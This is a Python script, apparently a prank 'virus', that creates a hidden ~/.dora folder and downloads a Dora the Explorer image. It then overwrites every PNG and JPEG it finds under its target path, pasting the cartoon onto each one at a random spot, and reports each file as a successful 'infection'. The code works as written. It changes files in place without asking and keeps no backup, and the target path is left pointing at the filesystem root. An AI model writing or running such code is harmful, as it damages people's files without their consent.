#!/usr/bin/env python3
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFilter

import os
from pathlib import Path

import random
import glob
import time

import requests

gh_path = "/.dora"
while True:
    if os.path.isdir(str(Path.home()) + gh_path):
        if gh_path == "/.dora":
            gh_path += "1"
        else:
            l_gh_path = gh_path + str(int(gh_path[-1]) + 1)
            gh_path = l_gh_path
    else:
        os.makedirs(str(Path.home()) + gh_path)
        break

home_fl = str(Path.home()) + gh_path
dora_img_path = f"{home_fl}/dora.png"

while True:
    try:
        print("Downloading image from https://assets.stickpng.com/images/580b57fbd9996e24bc43bd3e.png...")
        dd_img_b = requests.get("https://assets.stickpng.com/images/580b57fbd9996e24bc43bd3e.png")
        print("Download successful")
        break
    except:
        print("Download unsuccessful")
        print("Trying again in 5 minutes")
        time.sleep(300)

with open(dora_img_path, "wb") as f:
    f.write(dd_img_b.content)

dd_img_b.close()

imgs_path = ""

# this kinda works (capitalization format thing)
ff = [f"{imgs_path}/*.png", f"{imgs_path}/*.PNG", f"{imgs_path}/*.JPG", f"{imgs_path}/*.jpg", f"{imgs_path}/*.jpeg", f"{imgs_path}/*.JPEG"]
formats = ["png", "jpg", "jpeg"]

for i in formats:
    for x in range(len(i)):
        new = i
        neww = ""
        for y in new: 
            if y == new[x]:
                neww += y.upper()
            else:
                neww += y

        ff.append(f"{imgs_path}/*." + neww)

        neww = ""
        for y in new:
            if y == new[x]:
                neww += y
            else:
                neww += y.upper()

        ff.append(f"{imgs_path}/*." + neww)

posfil = []
for i in ff:
    for x in glob.glob(i):
        posfil.append(x)

# dora infecting ;)
dora = Image.open(dora_img_path)
for i in posfil:
    v_img = Image.open(i)

    cor_w = int(v_img.size[0]/4)
    cor_h = int(cor_w + (cor_w * 20)/100)

    temp_dora = dora.resize((cor_w, cor_h))
    temp_dora = temp_dora.convert("RGBA")

    mask_im = Image.new("L", (cor_w, cor_h), 0)
    draw = ImageDraw.Draw(mask_im)

    ten_p_w = (cor_w * 10)/100
    ten_p_h = (cor_h * 10)/100

    draw.ellipse((ten_p_w, ten_p_h, cor_w - ten_p_w, cor_h - ten_p_h), fill=255)
    mask_im_blur = mask_im.filter(ImageFilter.GaussianBlur(10))

    v_img.paste(temp_dora, (random.randrange(0, v_img.size[0]), random.randrange(0, v_img.size[1])), mask_im_blur)
    v_img.save(i, quality=95)
    print(f"Infection on {i} was successful")
